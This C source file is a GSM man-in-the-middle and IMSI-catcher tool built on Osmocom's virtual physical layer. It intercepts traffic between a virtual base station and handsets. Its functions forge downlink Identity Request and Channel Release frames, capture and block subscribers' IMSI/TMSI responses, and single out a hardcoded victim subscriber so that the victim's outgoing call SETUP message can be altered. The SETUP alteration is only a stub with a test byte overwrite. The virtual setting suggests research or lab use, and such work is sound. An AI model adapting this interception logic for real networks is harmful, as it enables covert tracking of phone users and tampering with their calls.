#include <stdio.h>
#include <getopt.h>
#include <virtphy/osmo_mcast_sock.h>
#include <virtphy/virtual_um.h>
#include <virtphy/common_util.h>
#include <osmocom/core/gsmtap.h>
#include <osmocom/core/utils.h>
#include <osmocom/gsm/protocol/gsm_04_08.h>
#include <osmocom/gsm/gsm48.h>
#include <osmocom/gsm/rsl.h>
#include <osmocom/core/gsmtap_util.h>
#include <osmocom/core/linuxlist.h>
#include <osmocom/gsm/lapd_core.h>
#include <osmocom/gsm/lapdm.h>
#include <coder.h>
#include <errno.h>
#include <string.h>
#include <lapdm_util.h>

#define DEFAULT_DL_RX_GRP DEFAULT_MS_MCAST_GROUP
#define DEFAULT_DL_TX_GRP "226.0.0.1"
#define DEFAULT_UL_RX_GRP "226.0.0.2"
#define DEFAULT_UL_TX_GRP DEFAULT_BTS_MCAST_GROUP
#define DEFAULT_MCAST_PORT 4729 /* IANA-registered port for GSMTAP */

#define IMSI_MAX_DIGITS 15
#define GSM_EXTENSION_LENGTH 15
#define tmsi_from_string(str) strtoul(str, NULL, 10)

enum mitm_state {
	STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD = 0, // Wait for either SERVICE ACCEPT or CIPHERING MODE COMMAND
	STATE_INTERCEPT_SETUP, // Wait for SETUP message
	STATE_IMSI_CATCHER_SABM, // we need to get the target imsi - tmsi mapping before we can go on with the attack. Basically we are an imsi catcher in this state.
	STATE_IMSI_CATCHER_I_TO_ID_REQ, // we manipulate the next information frame from the network to a fake identity request. So we do not have to implement a scheduler in the mitm.
	STATE_IMSI_CATCHER_IDENTITY_RESPONSE, // we get the requested identity from the response and block it
	STATE_IMSI_CATCHER_I_TO_CHAN_REL, // we manipulate the next information frame from the network to a channel release msg
};

const struct value_string vs_mitm_states[] = {
        {STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, "State: Wait for CM Service Accept | Ciphering Mode Cmd"},
        {STATE_INTERCEPT_SETUP, "State: Wait for Setup"},
        {STATE_IMSI_CATCHER_SABM, "State: Wait for Sabm"},
        {STATE_IMSI_CATCHER_I_TO_ID_REQ, "State: I Frame to Identity Request"},
        {STATE_IMSI_CATCHER_IDENTITY_RESPONSE, "State: Wait for Identity Response"},
        {STATE_IMSI_CATCHER_I_TO_CHAN_REL, "State: I Frame to Channel Release"},
};

enum subscriber_type {
	SUBSCRIBER_TYPE_VICTIM,
	SUBSCRIBER_TYPE_MISSING_IMSI,
	SUBSCRIBER_TYPE_OTHER
};

struct map_imsi_tmsi {
	char imsi[IMSI_MAX_DIGITS + 1];
	uint32_t tmsi;
	struct llist_head entry;
};

struct chan_desc {
	uint8_t type;
	uint8_t subchan;
	uint8_t timeslot;
};

struct pending_identity_request {
	uint8_t type; // @see Table 10.5.4 in TS 04.08
	struct map_imsi_tmsi * subscriber;
	struct chan_desc chan;
	uint8_t max_count;
	uint8_t request_lapd_hdr[3];
	uint8_t response_lapd_hdr[3];
};

struct pending_setup_intercept {
	uint8_t frame_delay;
	struct chan_desc chan;
};

static char* dl_rx_grp = DEFAULT_DL_RX_GRP;
static char* dl_tx_grp = DEFAULT_DL_TX_GRP;
static char* ul_rx_grp = DEFAULT_UL_RX_GRP;
static char* ul_tx_grp = DEFAULT_UL_TX_GRP;
static int port = DEFAULT_MCAST_PORT;

static struct virt_um_inst *downlink = NULL;
static struct virt_um_inst *uplink = NULL;

static enum mitm_state mitm_state = STATE_IMSI_CATCHER_SABM;
static struct pending_setup_intercept pending_setup_interc;
static struct pending_identity_request pending_identity_req;
LLIST_HEAD(subscribers);
static uint32_t intercept_arfcn = 666;

static char imsi_victim[GSM_EXTENSION_LENGTH + 1] = "901700000000403";
static char msisdn_victim[GSM_EXTENSION_LENGTH + 1] = "017519191919";
static char msisdn_called[GSM_EXTENSION_LENGTH + 1] = "017518181818";
static char msisdn_attacker[GSM_EXTENSION_LENGTH + 1] = "017517171717";

static void handle_options(int argc, char **argv)
{
	while (1) {
		int option_index = 0, c;
		static struct option long_options[] = {
			{"dl-rx-grp", 1, 0, 'v'},
			{"dl-tx-grp", 1, 0, 'w'},
		        {"ul-rx-grp", 1, 0, 'x'},
		        {"ul-tx-grp", 1, 0, 'y'},
		        {"port", 1, 0, 'z'},
		        {0, 0, 0, 0},
		};

		c = getopt_long(argc, argv, "z:y:x:w:v:", long_options,
		                &option_index);
		if (c == -1)
			break;

		switch (c) {
		case 'v':
			dl_rx_grp = optarg;
			break;
		case 'w':
			dl_tx_grp = optarg;
			break;
		case 'x':
			ul_rx_grp = optarg;
			break;
		case 'y':
			ul_tx_grp = optarg;
			break;
		case 'z':
			port = atoi(optarg);
			break;
		default:
			break;
		}
	}
}

int is_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
	return chan->type == chan_type && chan->subchan == subslot && chan->timeslot == timeslot;
}

void set_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
	chan->type = chan_type;
	chan->timeslot = timeslot;
	chan->subchan = subslot;
}

void log_state_change(uint8_t from, uint8_t to) {
	fprintf(stderr, "%s -> %s\n", get_value_string(vs_mitm_states, from), get_value_string(vs_mitm_states, to));
}

void manipulate_setup_message(uint8_t *msg) {
 // TODO: manipulate message
}

int check_subscriber(struct map_imsi_tmsi *subscriber) {

	if(subscriber == NULL) {
		return SUBSCRIBER_TYPE_OTHER;
	}
	// empty imsi
	if(strcmp(subscriber->imsi, "") == 0) {
		return SUBSCRIBER_TYPE_MISSING_IMSI;
	}
	return strcmp(subscriber->imsi, imsi_victim) == 0 ? SUBSCRIBER_TYPE_VICTIM : SUBSCRIBER_TYPE_OTHER;
}

struct map_imsi_tmsi* get_subscriber(uint8_t *mi, int mi_len) {

	uint8_t mi_type;
	char mi_string[GSM48_MI_SIZE];
	struct map_imsi_tmsi* subscriber;

	mi_type = mi[0] & GSM_MI_TYPE_MASK;
	gsm48_mi_to_string(mi_string, sizeof(mi_string), mi, mi_len);

	switch (mi_type) {
	case GSM_MI_TYPE_IMSI:
		llist_for_each_entry(subscriber, &subscribers, entry) {
			if (strcmp(mi_string, subscriber->imsi) == 0) {
				return subscriber;
			}
		}
		// tmsi not yet mapped -> create mapping to NULL
		subscriber = talloc_zero(NULL, struct map_imsi_tmsi);
		strcpy(subscriber->imsi, mi_string);
		llist_add(&subscriber->entry, &subscribers);
		return subscriber;
	case GSM_MI_TYPE_TMSI:
		llist_for_each_entry(subscriber, &subscribers, entry)
		{
			if (tmsi_from_string(mi_string) == subscriber->tmsi) {
				return subscriber;
			}
		}
		// tmsi not yet mapped -> create mapping to NULL
		subscriber = talloc_zero(NULL, struct map_imsi_tmsi);
		subscriber->tmsi = tmsi_from_string(mi_string);
		llist_add(&subscriber->entry, &subscribers);
		return subscriber;
	case GSM_MI_TYPE_IMEI:
	case GSM_MI_TYPE_IMEISV:
	default:
		// not interested in imei or any other identity type
		break;
	}
	return NULL;
}

static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
{
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr;
	struct gsm48_hdr *l3_hdr;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	struct msgb *manip_msg;
	int dump_msg = 0;
	int modified = 0;
	uint8_t nr, ns; // lapdm received nr and sent nr

	// simply forward downlink messages we do not want to intercept
	if (intercept_arfcn != arfcn) {
		goto forward_msg;
	}

	// filter out all msg not on dchan
	if (gsmtap_chantype == GSMTAP_CHANNEL_SDCCH4 ||
	    gsmtap_chantype == GSMTAP_CHANNEL_SDCCH8 ||
	    gsmtap_chantype == GSMTAP_CHANNEL_TCH_F) {

		msg->l2h = msgb_pull(msg, sizeof(*gh));
		l2_hdr = msgb_l2(msg);

		chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
		chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);

		if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
		                  &lctx)) {
			fprintf(stderr, "Frame number %d: lapd context could not be retrieved...\n",
			       gh->frame_number);
			goto push_hdr;
		}

		l3_hdr = msgb_l3(msg);
		msg->l2h = (unsigned char *) l2_hdr;
		msg->l1h = (unsigned char *) gh;
	}

	switch (mitm_state) {
	case STATE_IMSI_CATCHER_I_TO_ID_REQ:
		if(LAPDm_CTRL_is_I(l2_hdr[1]) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + (sizeof(*gh) * 8), "id_req");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			memcpy(manip_msg->l2h, l2_hdr, 3);
			lapdm_set_length((uint8_t *)manip_msg->l2h, 3, 0, 1);
			memcpy(pending_identity_req.request_lapd_hdr, manip_msg->l2h, 3);
			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_MM;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_MM_ID_REQ;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = pending_identity_req.type;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_IDENTITY_RESPONSE;
			log_state_change(STATE_IMSI_CATCHER_I_TO_ID_REQ, STATE_IMSI_CATCHER_IDENTITY_RESPONSE);
			fprintf(stderr, "-> Modified msg on downlink to identity request!\n");
			dump_msg = 1;
			modified = 1;
		}
		break;
	case STATE_IMSI_CATCHER_I_TO_CHAN_REL:
		if((LAPDm_CTRL_is_I(l2_hdr[1]) || LAPDm_CTRL_is_U(l2_hdr[1])) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + sizeof(*gh) * 8, "chan_rel");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			// reuse l2 hdr of identity request
			memcpy(manip_msg->l2h, pending_identity_req.request_lapd_hdr, 3);
			ns = LAPDm_CTRL_Nr(pending_identity_req.response_lapd_hdr[1]); // set ns to fit with expected nr from ms
			nr = LAPDm_CTRL_Nr(pending_identity_req.request_lapd_hdr[1]) + 1 ; // increment nr from identity request
			// prot ident for I Frame i 0
			// correct the I Frames rec nr and sent nr
			manip_msg->l2h[1] = LAPDm_CTRL_I(nr, ns, 0);

			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_RR;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_RR_CHAN_REL;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = GSM48_RR_CAUSE_NORMAL;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_SABM;
			log_state_change(STATE_IMSI_CATCHER_I_TO_CHAN_REL, STATE_IMSI_CATCHER_SABM);
			fprintf(stderr, "-> Modified msg on downlink to channel release request!\n");
			dump_msg = 1;
			modified = 1;
		}
		break;
	case STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD:
		if(is_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype)) {
			// check if we have a MM msg
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM) {
				// of type service accept
				if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_ACC) {
					mitm_state = STATE_INTERCEPT_SETUP;
					pending_setup_interc.frame_delay = 2;
					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
					fprintf(stderr, "-> Found CM service accept! Delay set to %d.\n", pending_setup_interc.frame_delay);
					dump_msg = 1;
				}
				// or ciphering request
				else if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_RR_CIPH_M_CMD) {
					mitm_state = STATE_INTERCEPT_SETUP;
					pending_setup_interc.frame_delay = 3;
					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
					fprintf(stderr, "-> Found RR ciphering mode command! Delay set to %d.\n", pending_setup_interc.frame_delay);
					dump_msg = 1;
				}
			}
		}
		break;
	default:
		break;
	}

push_hdr:
	// push all the bits that have been pulled before so that we have l1 header at data pointer again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

	if(dump_msg) {
		fprintf(stderr,"msg dump: %s\n", osmo_hexdump(msgb_data(msg), msgb_length(msg)));
	}
	if(modified) {
		fprintf(stderr,"mod dump: %s\n", osmo_hexdump(msgb_data(manip_msg), msgb_length(manip_msg)));
		virt_um_write_msg(downlink, manip_msg);
		msgb_free(msg);
		return;
	}

forward_msg:
	// Forward msg to downlink
	virt_um_write_msg(downlink, msg);
}

static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
{
	uint8_t encoded_msg[LEN_PLAIN / 8] = {0};
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr;
	struct gsm48_hdr *l3_hdr;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	memset(&mctx, 0, sizeof(mctx));
	memset(&lctx, 0, sizeof(lctx));
	struct msgb *manip_msg = NULL;
	int dump_msg = 0;
	int modified = 0;

	// simply forward uplink messages we do not want to intercept
	if ((intercept_arfcn | GSMTAP_ARFCN_F_UPLINK) != arfcn) {
		goto forward_msg;
	}

	// filter out all msg not on dchan
	if (gsmtap_chantype == GSMTAP_CHANNEL_SDCCH4 ||
	    gsmtap_chantype == GSMTAP_CHANNEL_SDCCH8 ||
	    gsmtap_chantype == GSMTAP_CHANNEL_TCH_F) {

		msg->l2h = msgb_pull(msg, sizeof(*gh));
		if(mitm_state != STATE_INTERCEPT_SETUP) {
			l2_hdr = msgb_l2(msg);

			chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
			chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);

			if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
					  &lctx)) {
				fprintf(stderr, "Frame number %d: lapd context could not be retrieved...\n",
				       gh->frame_number);
				goto push_hdr;
			}

			l3_hdr = msgb_l3(msg);
			msg->l2h = (unsigned char *) l2_hdr;
			msg->l1h = (unsigned char *) gh;
		}
	} else {
		goto forward_msg;
	}

	switch(mitm_state) {
	case STATE_IMSI_CATCHER_SABM:
		// check if we have a unnumbered frame of type SABM
		if(LAPDm_CTRL_is_U(l2_hdr[1]) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {

			// check if we have a MM CM service request
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_REQ) {
				struct gsm48_service_request *sreq = (struct gsm48_service_request *) l3_hdr->data;
				struct map_imsi_tmsi *subscriber = get_subscriber(sreq->mi, sreq->mi_len);

				switch(check_subscriber(subscriber)) {
				case SUBSCRIBER_TYPE_VICTIM:
					// our victim subscriber requested service!
					if(sreq->cm_service_type == GSM48_CMSERV_MO_CALL_PACKET) {
						// if we are here, we know that our victim requested a call establisment from the network
						set_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype);
						mitm_state = STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD;
						log_state_change(STATE_IMSI_CATCHER_SABM, STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD);
						fprintf(stderr, "-> Service request - mobile originated call of victim tmsi(%x), imsi(%s)\n", subscriber->tmsi, subscriber->imsi);
						dump_msg = 1;
					}
					break;
				case SUBSCRIBER_TYPE_MISSING_IMSI:
					pending_identity_req.subscriber = subscriber;
					pending_identity_req.type = GSM_MI_TYPE_IMSI;
					pending_identity_req.max_count = 3;
					set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);

					// start imsi catcher routine
					mitm_state = STATE_IMSI_CATCHER_I_TO_ID_REQ;
					log_state_change(STATE_IMSI_CATCHER_SABM, STATE_IMSI_CATCHER_I_TO_ID_REQ);
					fprintf(stderr, "-> Service request of unmapped tmsi (%x)\n", subscriber->tmsi);
					break;
				case SUBSCRIBER_TYPE_OTHER:
					// we are not interested in cm requests of subscribers other than victim
					break;
				}
			}
			// check if we have a MM CM service request
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_LOC_UPD_REQUEST) {
				struct gsm48_loc_upd_req *lureq = (struct gsm48_loc_upd_req *) l3_hdr->data;
				struct map_imsi_tmsi *subscriber = get_subscriber(lureq->mi, lureq->mi_len);

				switch(check_subscriber(subscriber)) {
				case SUBSCRIBER_TYPE_MISSING_IMSI:
					pending_identity_req.subscriber = subscriber;
					pending_identity_req.type = GSM_MI_TYPE_IMSI;
					pending_identity_req.max_count = 3;
					set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);

					// start imsi catcher routine
					mitm_state = STATE_IMSI_CATCHER_I_TO_ID_REQ;
					log_state_change(STATE_IMSI_CATCHER_SABM, STATE_IMSI_CATCHER_I_TO_ID_REQ);
					fprintf(stderr, "-> Location update request of unmapped tmsi (%x)\n", subscriber->tmsi);
					break;
				case SUBSCRIBER_TYPE_OTHER:
				case SUBSCRIBER_TYPE_VICTIM:
					// we are not interested in loc upd req of mapped subscribers
					break;
				}
			}
		}
		break;
	case STATE_INTERCEPT_SETUP:
		if(is_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype)) {
			// the third message on uplink after ciphering mode command should be the setup message
			// 1: LAPDM-Receive-Ready, 2: CIPHERING-MODE-COMPLETE, 3: SETUP
			if(--pending_setup_interc.frame_delay == 0) {
				// allocate msg for manipulation
				manip_msg = msgb_alloc(184 + (sizeof(*gh) *8), "mod_setup");
				// copy gsmtap header to manip msg
				manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
				memcpy(manip_msg->l1h, gh, sizeof(*gh));
				// from l2 the msg is probably enciphered, so we cannot use any info from that layers
				manip_msg->l2h = msgb_put(manip_msg, msgb_length(msg));

				// encode message as virtual layer does not support encoding right now
				xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
				manipulate_setup_message(encoded_msg);
				xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, manip_msg->l2h);

				// test manip
				msgb_data(manip_msg)[32] = 0x11;
				msgb_data(manip_msg)[33] = 0x11;
				msgb_data(manip_msg)[34] = 0x11;


				mitm_state = STATE_IMSI_CATCHER_SABM;
				log_state_change(STATE_INTERCEPT_SETUP, STATE_IMSI_CATCHER_SABM);
				fprintf(stderr, "-> Setup Message found and manipulated!\n");
				dump_msg = 1;
				modified = 1;
			}
		}
		// do nothing if the incoming msg is not on the synced channel
		break;
	case STATE_IMSI_CATCHER_IDENTITY_RESPONSE:
		if(is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			if(--pending_identity_req.max_count == 0) {
				mitm_state = STATE_IMSI_CATCHER_SABM;
				log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_SABM);
				fprintf(stderr, "-> No identity response detected...\n");
			}
			// check if we have a I Frame - MM Identity Response
			// Note: msg_type is not like msg_type in network standard C99+
			if(LAPDm_CTRL_is_I(l2_hdr[1]) &&
			   gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_ID_RESP) {
				uint8_t mi_len = l3_hdr->data[0]; // mobile identity length
				uint8_t* mi = &l3_hdr->data[1]; // mobile identity
				char mi_string[GSM48_MI_SIZE];
				uint8_t type = mi[0] & GSM_MI_TYPE_MASK;
				gsm48_mi_to_string(mi_string, sizeof(mi_string), mi, mi_len);
				memcpy(pending_identity_req.response_lapd_hdr, l2_hdr, 3);

				// if we got a response to our identity request, we do not want to forward it
				if(pending_identity_req.type == GSM_MI_TYPE_TMSI && type == GSM_MI_TYPE_TMSI) {
					pending_identity_req.subscriber->tmsi = tmsi_from_string(mi_string);
					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
					log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
					fprintf(stderr, "-> Catched and blocked identity response - tmsi!\n");
					goto free_msg;
				} else if(pending_identity_req.type == GSM_MI_TYPE_IMSI && type == GSM_MI_TYPE_IMSI) {
					strcpy(pending_identity_req.subscriber->imsi, mi_string);
					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
					log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
					fprintf(stderr, "-> Catched and blocked identity response - imsi!\n");
					goto free_msg;
				}
			}
		}
		break;
	default:
		break;
	}
push_hdr:
	// push all the bits that have been pulled before so that we have l1 header at data pointer again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

	if(dump_msg) {
		fprintf(stderr, "msg dump: %s\n", osmo_hexdump(msgb_data(msg), msgb_length(msg)));
	}
	if(modified) {
		fprintf(stderr,"mod dump: %s\n", osmo_hexdump(msgb_data(manip_msg), msgb_length(manip_msg)));
		virt_um_write_msg(downlink, manip_msg);
		msgb_free(msg);
		return;
	}

	// Forward msg to uplink
forward_msg:
	virt_um_write_msg(uplink, msg);
	return;
free_msg:
	msgb_free(msg);
}

int main(int argc, char **argv)
{

	fprintf(stderr, "STARTUP...\n");

	handle_options(argc, argv);

	// The socket intercepting downlink traffic
	downlink = virt_um_init(NULL, dl_tx_grp, port, dl_rx_grp, port,
	                        downlink_rcv_cb);
	// The socket intercepting uplink traffic
	uplink = virt_um_init(NULL, ul_tx_grp, port, ul_rx_grp, port,
	                      uplink_rcv_cb);
	while (1) {
		// handle osmocom fd READ events (l1ctl-unix-socket, virtual-um-mcast-socket)
		osmo_select_main(0);
	}

	virt_um_destroy(downlink);
	virt_um_destroy(uplink);

	// not reached
	return EXIT_FAILURE;
}
